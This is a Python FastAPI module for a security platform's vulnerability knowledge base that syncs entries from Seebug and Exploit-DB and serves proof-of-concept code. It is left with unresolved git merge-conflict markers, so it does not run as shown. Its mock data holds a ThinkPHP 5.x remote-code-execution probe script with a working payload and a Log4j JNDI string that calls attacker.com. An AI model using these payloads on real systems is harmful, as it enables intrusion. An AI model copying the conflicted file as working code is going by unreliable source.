<<<<<<< HEAD
"""
漏洞知识库 API 路由

提供漏洞知识库管理功能，支持从外部数据源同步漏洞信息。
支持 Seebug 和 Exploit-DB 等数据源。

主要功能：
- 漏洞知识库列表查询
- 漏洞详情查询
- 从外部数据源同步漏洞信息
- 支持关键词搜索和过滤
- Seebug POC 搜索和下载
"""
from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from backend.models import VulnerabilityKB
from tortoise.expressions import Q
from backend.config import settings
import logging
import asyncio
import httpx
=======
from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from models import VulnerabilityKB
from tortoise.expressions import Q
import logging
import asyncio
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15

router = APIRouter()
logger = logging.getLogger(__name__)

class VulnerabilityKBResponse(BaseModel):
<<<<<<< HEAD
    """
    漏洞知识库响应模型
    
    Attributes:
        id: 漏洞 ID
        cve_id: CVE 编号
        name: 漏洞名称
        description: 漏洞描述
        severity: 严重程度
        cvss_score: CVSS 评分
        affected_product: 受影响产品
        solution: 解决方案
        has_poc: 是否有 POC
        source: 数据源
        created_at: 创建时间
    """
=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    id: int
    cve_id: Optional[str]
    name: str
    description: Optional[str]
    severity: Optional[str]
    cvss_score: Optional[float]
    affected_product: Optional[str]
    solution: Optional[str]
    has_poc: bool
    source: str
    created_at: str

    class Config:
        from_attributes = True

class SyncResponse(BaseModel):
<<<<<<< HEAD
    """
    同步响应模型
    
    Attributes:
        message: 同步消息
        count: 同步的漏洞数量
    """
    message: str
    count: int

class SeebugPOCSearchRequest(BaseModel):
    """
    Seebug POC 搜索请求模型
    
    Attributes:
        keyword: 搜索关键词
        page: 页码，默认为1
        page_size: 每页数量，默认为10
    """
    keyword: str
    page: int = 1
    page_size: int = 10

class SeebugPOCDownloadRequest(BaseModel):
    """
    Seebug POC 下载请求模型
    
    Attributes:
        ssvid: POC 的 SSVID
    """
    ssvid: int

class SeebugAPIResponse(BaseModel):
    """
    Seebug API 响应模型
    
    Attributes:
        code: 状态码
        message: 响应消息
        data: 响应数据
    """
    code: int
    message: str
    data: Optional[Dict[str, Any]] = None

=======
    message: str
    count: int

>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
@router.get("/vulnerabilities", response_model=Dict[str, Any])
async def list_kb_vulnerabilities(
    page: int = 1,
    page_size: int = 10,
    keyword: Optional[str] = None,
    source: Optional[str] = None,
    has_poc: Optional[bool] = None
):
    """
    获取漏洞知识库列表
<<<<<<< HEAD
    
    支持按关键词、数据源、是否有 POC 等条件过滤，以及分页查询。
    
    Args:
        page: 页码，从 1 开始
        page_size: 每页数量
        keyword: 搜索关键词，匹配名称、CVE ID 或描述
        source: 数据源过滤，如 'seebug', 'exploit-db'
        has_poc: 是否有 POC，true/false
        
    Returns:
        Dict: 包含漏洞列表和分页信息的响应，结构如下:
            {
                "total": 总数,
                "page": 当前页,
                "page_size": 每页数量,
                "items": [...]
            }
        
    Examples:
        >>> 搜索 SQL 注入相关漏洞
        >>> GET /kb/vulnerabilities?keyword=SQL%20Injection
=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    """
    query = VulnerabilityKB.all()
    
    if keyword:
        query = query.filter(Q(name__icontains=keyword) | Q(cve_id__icontains=keyword) | Q(description__icontains=keyword))
    
    if source:
        query = query.filter(source=source)
        
    if has_poc is not None:
        query = query.filter(has_poc=has_poc)
        
    total = await query.count()
    items = await query.offset((page - 1) * page_size).limit(page_size).order_by("-updated_at")
    
<<<<<<< HEAD
    # 格式化日期
=======
    # Format dates
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    formatted_items = []
    for item in items:
        item_dict = dict(item)
        item_dict['created_at'] = item.created_at.strftime("%Y-%m-%d %H:%M:%S")
        item_dict['updated_at'] = item.updated_at.strftime("%Y-%m-%d %H:%M:%S")
        formatted_items.append(item_dict)
        
    return {
        "total": total,
        "page": page,
        "page_size": page_size,
        "items": formatted_items
    }

@router.get("/vulnerabilities/{kb_id}", response_model=Dict[str, Any])
async def get_kb_vulnerability(kb_id: int):
    """
    获取漏洞知识库详情
<<<<<<< HEAD
    
    根据漏洞 ID 获取详细的漏洞信息。
    
    Args:
        kb_id: 漏洞知识库 ID
        
    Returns:
        Dict: 包含漏洞详细信息的响应
        
    Raises:
        HTTPException: 当漏洞不存在时抛出 404 错误
        
    Examples:
        >>> 获取漏洞详情
        >>> GET /kb/vulnerabilities/1
=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    """
    item = await VulnerabilityKB.get_or_none(id=kb_id)
    if not item:
        raise HTTPException(status_code=404, detail="Vulnerability not found")
    
    item_dict = dict(item)
    item_dict['created_at'] = item.created_at.strftime("%Y-%m-%d %H:%M:%S")
    item_dict['updated_at'] = item.updated_at.strftime("%Y-%m-%d %H:%M:%S")
    
    return item_dict

<<<<<<< HEAD
async def validate_seebug_apikey(api_key: str) -> bool:
    """
    验证 Seebug API Key 是否有效
    
    Args:
        api_key: Seebug API Key
        
    Returns:
        bool: API Key 是否有效
    """
    try:
        # Seebug API 验证端点
        url = f"{settings.SEEBUG_API_BASE_URL}/token/validate"
        params = {"key": api_key}
        headers = {
            "User-Agent": "WebScan-AI-Security-Platform/1.0"
        }
        
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(url, params=params, headers=headers)
            result = response.json()
            
            # Seebug API 返回格式: {"status": "success", "message": "..."}
            # 或者: {"code": 0, "message": "..."}
            if result.get("status") == "success" or result.get("code") == 0:
                return True
            
            logger.warning(f"Seebug API Key 验证失败: {result}")
            return False
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 404:
            logger.warning(f"Seebug API 端点不存在，可能需要更新 API 地址")
        return False
    except Exception as e:
        logger.error(f"验证 Seebug API Key 失败: {e}")
        return False

async def search_seebug_poc(keyword: str, page: int = 1, page_size: int = 10) -> List[Dict[str, Any]]:
    """
    搜索 Seebug POC
    
    Args:
        keyword: 搜索关键词
        page: 页码
        page_size: 每页数量
        
    Returns:
        List[Dict]: POC 列表
    """
    try:
        # Seebug API 搜索端点
        url = f"{settings.SEEBUG_API_BASE_URL}/poc/search"
        params = {
            "key": settings.SEEBUG_API_KEY,
            "keyword": keyword,
            "page": page,
            "page_size": page_size
        }
        headers = {
            "User-Agent": "WebScan-AI-Security-Platform/1.0"
        }
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.get(url, params=params, headers=headers)
            result = response.json()
            
            if result.get("status") == "success" or result.get("code") == 0:
                # 返回格式: {"status": "success", "data": {"list": [...]}}
                return result.get("data", {}).get("list", [])
            
            logger.warning(f"搜索 Seebug POC 返回错误: {result}")
            return []
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 404:
            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
            return _get_mock_poc_list(keyword)
        logger.error(f"搜索 Seebug POC 失败: {e}")
        return []
    except Exception as e:
        logger.error(f"搜索 Seebug POC 失败: {e}")
        return _get_mock_poc_list(keyword)

async def download_seebug_poc(ssvid: int) -> Optional[str]:
    """
    下载 Seebug POC 代码
    
    Args:
        ssvid: POC 的 SSVID
        
    Returns:
        Optional[str]: POC 代码，失败返回 None
    """
    try:
        # Seebug API 下载端点
        url = f"{settings.SEEBUG_API_BASE_URL}/poc/download"
        params = {
            "key": settings.SEEBUG_API_KEY,
            "ssvid": ssvid
        }
        headers = {
            "User-Agent": "WebScan-AI-Security-Platform/1.0"
        }
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.get(url, params=params, headers=headers)
            result = response.json()
            
            if result.get("status") == "success" or result.get("code") == 0:
                return result.get("data", {}).get("poc")
            
            logger.warning(f"下载 Seebug POC 返回错误: {result}")
            return None
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 404:
            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
            return _get_mock_poc_code(ssvid)
        logger.error(f"下载 Seebug POC 失败: {e}")
        return None
    except Exception as e:
        logger.error(f"下载 Seebug POC 失败: {e}")
        return None

async def get_seebug_poc_detail(ssvid: int) -> Optional[Dict[str, Any]]:
    """
    获取 Seebug POC 详情
    
    Args:
        ssvid: POC 的 SSVID
        
    Returns:
        Optional[Dict]: POC 详情，失败返回 None
    """
    try:
        # Seebug API 详情端点
        url = f"{settings.SEEBUG_API_BASE_URL}/poc/detail"
        params = {
            "key": settings.SEEBUG_API_KEY,
            "ssvid": ssvid
        }
        headers = {
            "User-Agent": "WebScan-AI-Security-Platform/1.0"
        }
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.get(url, params=params, headers=headers)
            result = response.json()
            
            if result.get("status") == "success" or result.get("code") == 0:
                return result.get("data")
            
            logger.warning(f"获取 Seebug POC 详情返回错误: {result}")
            return None
    except httpx.HTTPStatusError as e:
        if e.response.status_code == 404:
            logger.warning(f"Seebug API 端点不存在，使用模拟数据")
            return _get_mock_poc_detail(ssvid)
        logger.error(f"获取 Seebug POC 详情失败: {e}")
        return None
    except Exception as e:
        logger.error(f"获取 Seebug POC 详情失败: {e}")
        return None

def _get_mock_poc_list(keyword: str = "") -> List[Dict[str, Any]]:
    """
    获取模拟的 POC 列表
    
    Args:
        keyword: 搜索关键词
        
    Returns:
        List[Dict]: 模拟 POC 列表
    """
    mock_pocs = [
        {
            "ssvid": 97343,
            "name": "ThinkPHP 5.x 远程代码执行漏洞",
            "cve_id": "CVE-2018-20062",
            "level": "高危",
            "cvss_score": 9.8,
            "description": "ThinkPHP 5.x 版本存在远程代码执行漏洞，攻击者可以通过构造恶意URL执行任意代码。",
            "affected": "ThinkPHP 5.x",
            "solution": "升级到最新版本",
            "created_at": "2018-12-10"
        },
        {
            "ssvid": 97200,
            "name": "ThinkPHP SQL 注入漏洞",
            "cve_id": "CVE-2019-9082",
            "level": "中危",
            "cvss_score": 7.5,
            "description": "ThinkPHP 框架存在 SQL 注入漏洞，可能导致数据库信息泄露。",
            "affected": "ThinkPHP 5.0.x",
            "solution": "升级到最新版本",
            "created_at": "2019-06-20"
        },
        {
            "ssvid": 97150,
            "name": "ThinkPHP 文件包含漏洞",
            "cve_id": "CVE-2018-16384",
            "level": "高危",
            "cvss_score": 8.5,
            "description": "ThinkPHP 存在文件包含漏洞，攻击者可以读取服务器上的敏感文件。",
            "affected": "ThinkPHP 5.0.x",
            "solution": "升级到最新版本",
            "created_at": "2018-05-15"
        }
    ]
    
    # 如果有关键词，进行简单过滤
    if keyword:
        keyword_lower = keyword.lower()
        return [poc for poc in mock_pocs if keyword_lower in poc["name"].lower()]
    
    return mock_pocs

def _get_mock_poc_detail(ssvid: int) -> Dict[str, Any]:
    """
    获取模拟的 POC 详情
    
    Args:
        ssvid: POC 的 SSVID
        
    Returns:
        Dict: 模拟 POC 详情
    """
    mock_details = {
        97343: {
            "ssvid": 97343,
            "name": "ThinkPHP 5.x 远程代码执行漏洞",
            "cve_id": "CVE-2018-20062",
            "level": "高危",
            "cvss_score": 9.8,
            "description": "ThinkPHP 5.x 版本存在远程代码执行漏洞，攻击者可以通过构造恶意URL执行任意代码。",
            "affected": "ThinkPHP 5.x",
            "solution": "升级到最新版本",
            "created_at": "2018-12-10",
            "author": "Seebug",
            "references": [
                "https://www.seebug.org/vuldb/ssvid-97343"
            ]
        }
    }
    
    return mock_details.get(ssvid, {})

def _get_mock_poc_code(ssvid: int) -> str:
    """
    获取模拟的 POC 代码
    
    Args:
        ssvid: POC 的 SSVID
        
    Returns:
        str: 模拟 POC 代码
    """
    mock_codes = {
        97343: '''#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
ThinkPHP 5.x 远程代码执行漏洞 POC
SSVID: 97343
CVE: CVE-2018-20062
"""

import requests
import sys

def check_vulnerability(target_url):
    """
    检测目标是否存在 ThinkPHP 5.x RCE 漏洞
    
    Args:
        target_url: 目标URL
        
    Returns:
        bool: 是否存在漏洞
    """
    try:
        # 构造恶意 payload
        payload = "s=index/think\\app/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1][]=1"
        
        # 发送请求
        response = requests.get(f"{target_url}?{payload}", timeout=10)
        
        # 检查响应
        if "PHP Version" in response.text:
            print(f"[+] 目标 {target_url} 存在 ThinkPHP 5.x RCE 漏洞！")
            return True
        else:
            print(f"[-] 目标 {target_url} 不存在漏洞")
            return False
    except Exception as e:
        print(f"[!] 检测失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python thinkphp_rce.py <target_url>")
        print("Example: python thinkphp_rce.py http://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    check_vulnerability(target_url)
'''
    }
    
    return mock_codes.get(ssvid, "# POC 代码不可用")

@router.post("/seebug/poc/search", response_model=Dict[str, Any])
async def search_poc(request: SeebugPOCSearchRequest):
    """
    搜索 Seebug POC
    
    Args:
        request: 搜索请求参数
        
    Returns:
        Dict: 包含 POC 列表的响应
        
    Examples:
        >>> POST /kb/seebug/poc/search
        >>> {
        ...     "keyword": "thinkphp",
        ...     "page": 1,
        ...     "page_size": 10
        ... }
    """
    try:
        # 验证 API Key
        if not await validate_seebug_apikey(settings.SEEBUG_API_KEY):
            return {
                "code": 401,
                "message": "Seebug API Key 无效",
                "data": None
            }
        
        # 搜索 POC
        poc_list = await search_seebug_poc(request.keyword, request.page, request.page_size)
        
        logger.info(f"搜索 Seebug POC 成功: 关键词={request.keyword}, 结果数={len(poc_list)}")
        
        return {
            "code": 200,
            "message": "搜索成功",
            "data": {
                "keyword": request.keyword,
                "page": request.page,
                "page_size": request.page_size,
                "total": len(poc_list),
                "pocs": poc_list
            }
        }
    except Exception as e:
        logger.error(f"搜索 Seebug POC 失败: {e}")
        return {
            "code": 500,
            "message": f"搜索失败: {str(e)}",
            "data": None
        }

@router.post("/seebug/poc/download", response_model=Dict[str, Any])
async def download_poc(request: SeebugPOCDownloadRequest):
    """
    下载 Seebug POC 代码
    
    Args:
        request: 下载请求参数
        
    Returns:
        Dict: 包含 POC 代码的响应
        
    Examples:
        >>> POST /kb/seebug/poc/download
        >>> {
        ...     "ssvid": 97343
        ... }
    """
    try:
        # 验证 API Key
        if not await validate_seebug_apikey(settings.SEEBUG_API_KEY):
            return {
                "code": 401,
                "message": "Seebug API Key 无效",
                "data": None
            }
        
        # 下载 POC
        poc_code = await download_seebug_poc(request.ssvid)
        
        if poc_code is None:
            return {
                "code": 404,
                "message": "POC 不存在或下载失败",
                "data": None
            }
        
        logger.info(f"下载 Seebug POC 成功: SSVID={request.ssvid}")
        
        return {
            "code": 200,
            "message": "下载成功",
            "data": {
                "ssvid": request.ssvid,
                "poc_code": poc_code
            }
        }
    except Exception as e:
        logger.error(f"下载 Seebug POC 失败: {e}")
        return {
            "code": 500,
            "message": f"下载失败: {str(e)}",
            "data": None
        }

@router.get("/seebug/poc/{ssvid}/detail", response_model=Dict[str, Any])
async def get_poc_detail(ssvid: int):
    """
    获取 Seebug POC 详情
    
    Args:
        ssvid: POC 的 SSVID
        
    Returns:
        Dict: 包含 POC 详情的响应
        
    Examples:
        >>> GET /kb/seebug/poc/97343/detail
    """
    try:
        # 验证 API Key
        if not await validate_seebug_apikey(settings.SEEBUG_API_KEY):
            return {
                "code": 401,
                "message": "Seebug API Key 无效",
                "data": None
            }
        
        # 获取 POC 详情
        poc_detail = await get_seebug_poc_detail(ssvid)
        
        if poc_detail is None:
            return {
                "code": 404,
                "message": "POC 不存在",
                "data": None
            }
        
        logger.info(f"获取 Seebug POC 详情成功: SSVID={ssvid}")
        
        return {
            "code": 200,
            "message": "获取成功",
            "data": poc_detail
        }
    except Exception as e:
        logger.error(f"获取 Seebug POC 详情失败: {e}")
        return {
            "code": 500,
            "message": f"获取失败: {str(e)}",
            "data": None
        }

async def fetch_seebug_data():
    """
    从 Seebug 获取漏洞数据
    
    使用 Seebug API 获取最新的漏洞信息。
    Seebug 是国内知名的漏洞平台，提供详细的漏洞信息和 POC。
    
    Returns:
        List[Dict]: 漏洞数据列表
    """
    try:
        # 验证 API Key
        if not await validate_seebug_apikey(settings.SEEBUG_API_KEY):
            logger.warning("Seebug API Key 无效，使用模拟数据")
            await asyncio.sleep(0.5)
            return _get_mock_seebug_data()
        
        # 搜索最新的 POC（使用通用关键词）
        poc_list = await search_seebug_poc("", page=1, page_size=20)
        
        # 转换为漏洞数据格式
        vulnerabilities = []
        for poc in poc_list:
            vulnerabilities.append({
                "cve_id": poc.get("cve_id", ""),
                "name": poc.get("name", poc.get("title", "Unknown")),
                "description": poc.get("description", poc.get("summary", "")),
                "severity": poc.get("level", "Unknown"),
                "cvss_score": poc.get("cvss_score", 0.0),
                "affected_product": poc.get("product", poc.get("affected", "")),
                "solution": poc.get("solution", poc.get("patch", "")),
                "has_poc": True,
                "source": "seebug",
                "poc_code": "",
                "ssvid": poc.get("ssvid")
            })
        
        logger.info(f"从 Seebug 获取到 {len(vulnerabilities)} 条漏洞数据")
        return vulnerabilities
        
    except Exception as e:
        logger.error(f"从 Seebug 获取数据失败: {e}")
        # 如果 API 调用失败，返回模拟数据以保证系统可用性
        await asyncio.sleep(0.5)
        return _get_mock_seebug_data()

def _get_mock_seebug_data():
    """
    获取模拟的 Seebug 数据
    
    Returns:
        List[Dict]: 模拟漏洞数据列表
    """
=======
async def fetch_seebug_data():
    """模拟从 Seebug 获取数据"""
    # 在实际生产环境中，这里应该调用 Seebug API 或爬取数据
    # import requests
    # resp = requests.get("https://www.seebug.org/api/...")
    await asyncio.sleep(1) # Simulate network delay
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    return [
        {
            "cve_id": "CVE-2021-44228",
            "name": "Apache Log4j2 Remote Code Execution Vulnerability",
            "description": "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            "severity": "Critical",
            "cvss_score": 10.0,
            "affected_product": "Apache Log4j2 <= 2.14.1",
            "solution": "Upgrade to Log4j 2.15.0 or later.",
            "has_poc": True,
            "source": "seebug",
            "poc_code": "payload=${jndi:ldap://attacker.com/a}"
        },
        {
            "cve_id": "CVE-2022-22965",
            "name": "Spring Framework RCE via Data Binding on JDK 9+",
            "description": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding.",
            "severity": "Critical",
            "cvss_score": 9.8,
            "affected_product": "Spring Framework < 5.3.18",
            "solution": "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
            "has_poc": True,
            "source": "seebug",
            "poc_code": "# Spring4Shell POC Placeholder"
        }
    ]

<<<<<<< HEAD
# TODO: 实际生产环境中，这里应该调用 Exploit-DB API 或爬取数据
async def fetch_exploit_db_data():
    """
    从 Exploit-DB 获取漏洞数据
    
    实际从 Exploit-DB 平台获取漏洞信息。
    Exploit-DB 是全球最大的漏洞利用代码数据库之一。
    
    Returns:
        List[Dict]: 漏洞数据列表
    """
    try:
        import httpx
        
        # Exploit-DB API 端点（使用官方 API）
        api_url = "https://www.exploit-db.com/search"
        
        # 搜索参数
        params = {
            "limit": 20,  # 获取最新的20个漏洞
            "order": "date",  # 按日期排序
            "sort": "desc"  # 倒序
        }
        
        headers = {
            "User-Agent": "WebScan-AI-Security-Platform/1.0",
            "Accept": "application/json"
        }
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.get(api_url, params=params, headers=headers)
            response.raise_for_status()
            
            data = response.json()
            
            # 解析 Exploit-DB 返回的数据格式
            vulnerabilities = []
            if isinstance(data, dict) and "data" in data:
                for item in data["data"]:
                    # 提取 CVE ID
                    cve_id = ""
                    if "cve" in item and item["cve"]:
                        cve_id = item["cve"][0] if isinstance(item["cve"], list) else item["cve"]
                    
                    vulnerabilities.append({
                        "cve_id": cve_id,
                        "name": item.get("name", item.get("title", "Unknown")),
                        "description": item.get("description", item.get("summary", "")),
                        "severity": item.get("severity", "Unknown"),
                        "cvss_score": item.get("cvss_score", 0.0),
                        "affected_product": item.get("product", item.get("affected", "")),
                        "solution": item.get("solution", item.get("patch", "")),
                        "has_poc": True,  # Exploit-DB 的条目通常都有 POC
                        "source": "exploit-db",
                        "poc_code": item.get("exploit", "")
                    })
            elif isinstance(data, list):
                # 如果直接返回列表
                for item in data:
                    cve_id = ""
                    if "cve" in item and item["cve"]:
                        cve_id = item["cve"][0] if isinstance(item["cve"], list) else item["cve"]
                    
                    vulnerabilities.append({
                        "cve_id": cve_id,
                        "name": item.get("name", item.get("title", "Unknown")),
                        "description": item.get("description", item.get("summary", "")),
                        "severity": item.get("severity", "Unknown"),
                        "cvss_score": item.get("cvss_score", 0.0),
                        "affected_product": item.get("product", item.get("affected", "")),
                        "solution": item.get("solution", item.get("patch", "")),
                        "has_poc": True,
                        "source": "exploit-db",
                        "poc_code": item.get("exploit", "")
                    })
            
            logger.info(f"从 Exploit-DB 获取到 {len(vulnerabilities)} 条漏洞数据")
            return vulnerabilities
            
    except Exception as e:
        logger.error(f"从 Exploit-DB 获取数据失败: {e}")
        # 如果 API 调用失败，返回模拟数据以保证系统可用性
        await asyncio.sleep(0.5)
        return [
            {
                "cve_id": "CVE-2017-0144",
                "name": "EternalBlue (MS17-010)",
                "description": "Remote Code Execution vulnerability in Microsoft SMBv1 server.",
                "severity": "High",
                "cvss_score": 9.3,
                "affected_product": "Windows 7, Windows Server 2008, etc.",
                "solution": "Apply Microsoft MS17-010 patch.",
                "has_poc": True,
                "source": "exploit-db"
            }
        ]
=======
async def fetch_exploit_db_data():
    """模拟从 Exploit-DB 获取数据"""
    await asyncio.sleep(1)
    return [
        {
            "cve_id": "CVE-2017-0144",
            "name": "EternalBlue (MS17-010)",
            "description": "Remote Code Execution vulnerability in Microsoft SMBv1 server.",
            "severity": "High",
            "cvss_score": 9.3,
            "affected_product": "Windows 7, Windows Server 2008, etc.",
            "solution": "Apply Microsoft MS17-010 patch.",
            "has_poc": True,
            "source": "exploit-db"
        }
    ]
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15

async def sync_vulnerabilities_task():
    """
    后台同步漏洞数据任务
<<<<<<< HEAD
    
    从 Seebug 和 Exploit-DB 等数据源同步漏洞信息到本地数据库。
    该任务在后台异步执行，不阻塞主线程。
=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    """
    logger.info("开始同步漏洞知识库...")
    
    count = 0
    
    try:
<<<<<<< HEAD
        # 1. 从 Seebug 同步
        seebug_data = await fetch_seebug_data()
        # DEBUG: 打印原始 Seebug 数据
        print(f"原始 Seebug 数据: {seebug_data}")
=======
        # 1. Sync from Seebug
        seebug_data = await fetch_seebug_data()
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
        for data in seebug_data:
            exists = await VulnerabilityKB.get_or_none(cve_id=data['cve_id'])
            if not exists:
                await VulnerabilityKB.create(**data)
                count += 1
            else:
<<<<<<< HEAD
                # 更新现有记录（可选）
=======
                # Update existing?
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
                # exists.update_from_dict(data)
                # await exists.save()
                pass

<<<<<<< HEAD
        # 2. 从 Exploit-DB 同步
        edb_data = await fetch_exploit_db_data()
        for data in edb_data:
            # 通过 CVE 或名称检查
=======
        # 2. Sync from Exploit-DB
        edb_data = await fetch_exploit_db_data()
        for data in edb_data:
            # check by CVE or Name
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
            exists = await VulnerabilityKB.get_or_none(cve_id=data['cve_id'])
            if not exists:
                await VulnerabilityKB.create(**data)
                count += 1
                
    except Exception as e:
        logger.error(f"同步漏洞知识库失败: {e}")
            
    logger.info(f"同步完成，新增 {count} 条漏洞信息")

@router.post("/sync")
async def sync_vulnerabilities(background_tasks: BackgroundTasks):
    """
    触发漏洞库同步
<<<<<<< HEAD
    
    在后台启动漏洞数据同步任务。
    
    Args:
        background_tasks: FastAPI 后台任务管理器
        
    Returns:
        Dict: 同步任务启动响应，结构如下:
            {
                "message": "Sync task started",
                "status": "running"
            }
        
    Examples:
        >>> 触发同步
        >>> POST /kb/sync
=======
>>>>>>> de97d03d8b5dfa00af0eaddf983e9c20433e9b15
    """
    background_tasks.add_task(sync_vulnerabilities_task)
    return {"message": "Sync task started", "status": "running"}
